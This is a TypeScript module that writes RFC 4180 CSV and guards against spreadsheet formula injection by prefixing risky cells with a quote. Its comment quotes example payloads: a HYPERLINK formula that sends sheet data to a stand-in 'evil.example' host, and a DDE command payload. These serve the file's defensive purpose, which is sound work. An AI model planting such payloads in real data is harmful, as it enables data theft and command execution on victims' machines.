/*
 * CSV writing, as a pure function (no DOM). RFC 4180:
 *  - comma separator, CRLF line endings, a header row first;
 *  - a field is quoted when it contains a comma, a double quote, CR or LF,
 *    and quotes inside it are doubled;
 *  - the file ENDS with a CRLF after the last row (RFC 4180 allows it, and
 *    every spreadsheet reads it; a header-only file is one line plus CRLF).
 * No BOM here: downloadCsv adds it, so this output stays plain text for tests.
 */

export interface CsvColumn<T> {
  header: string
  value: (row: T) => unknown
}

const CRLF = '\r\n'

/**
 * FORMULA INJECTION GUARD (OWASP "CSV Injection").
 *
 * Spreadsheets treat a cell that starts with =, +, - or @ as a formula, and
 * some also act on a leading tab or CR. A customer name like
 * `=HYPERLINK("https://evil.example?d="&A1, "Click")` or a DDE payload such as
 * `=cmd|' /C calc'!A0` would run in the exporting user's spreadsheet, with
 * access to the rest of the sheet. Any string that came from a user (names,
 * emails, references) can carry one.
 *
 * The defence: prefix such strings with a single quote, which spreadsheets
 * read as "this is text". Plain numbers are exempt: "-12.50" from our own
 * amount column must stay a number, or totals stop adding up. "+1" is NOT
 * treated as a number: a leading plus is a formula trigger and isn't how we
 * write numbers.
 */
const FORMULA_TRIGGER = /^[=+\-@\t\r]/
const PLAIN_NUMBER = /^-?\d+(\.\d+)?$/

export function guardFormula(value: string): string {
  return FORMULA_TRIGGER.test(value) && !PLAIN_NUMBER.test(value) ? `'${value}` : value
}

const NEEDS_QUOTES = /[",\r\n]/

/** A value as cell text, before quoting. */
function fieldText(value: unknown): string {
  if (value === null || value === undefined) return ''
  if (typeof value === 'string') return guardFormula(value)
  // Numbers, bigints and booleans as they are: no locale formatting and no
  // guard (String(-5) starts with "-", but it's a number, not a formula).
  if (typeof value === 'number' || typeof value === 'bigint' || typeof value === 'boolean') {
    return String(value)
  }
  if (value instanceof Date) return value.toISOString()
  // Anything else (an object a csv function returned by mistake) as JSON, still guarded.
  return guardFormula(JSON.stringify(value) ?? '')
}

/** One field: null/undefined → empty, numbers as String(), strings guarded, then quoted if needed. */
export function csvField(value: unknown): string {
  const text = fieldText(value)
  return NEEDS_QUOTES.test(text) ? `"${text.replaceAll('"', '""')}"` : text
}

/** The CSV text for `rows`: a header row, then one line per row, each ending in CRLF. */
export function toCsv<T>(rows: readonly T[], columns: readonly CsvColumn<T>[]): string {
  const lines = [
    columns.map((column) => csvField(column.header)),
    ...rows.map((row) => columns.map((column) => csvField(column.value(row)))),
  ]
  return lines.map((fields) => fields.join(',') + CRLF).join('')
}
